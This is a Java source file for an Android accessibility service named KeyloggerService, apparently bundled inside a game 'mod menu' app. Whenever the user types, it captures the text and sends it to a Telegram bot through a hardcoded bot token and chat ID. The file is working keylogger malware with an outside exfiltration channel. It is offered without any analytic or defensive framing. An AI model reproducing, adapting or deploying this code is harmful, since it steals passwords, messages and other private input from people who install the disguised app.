package com.br.modmenu;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
public class KeyloggerService extends AccessibilityService {
    private final String BOT_TOKEN = "9235961136:AAEF8tmuu4XYIDvT_Pp_WFUXEyCrqawhhoM";
    private final String CHAT_ID = "8522184173";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                if (text != null && text.length() > 0) sendTg("Ввод: " + text.toString());
            }
        }
    }
    @Override
    public void onInterrupt() {}
    private void sendTg(final String text) {
        new Thread(new Runnable() {
            public void run() {
                try {
                    String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                    HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                    conn.getResponseCode();
                } catch (Exception e) {}
            }
        }).start();
    }
}
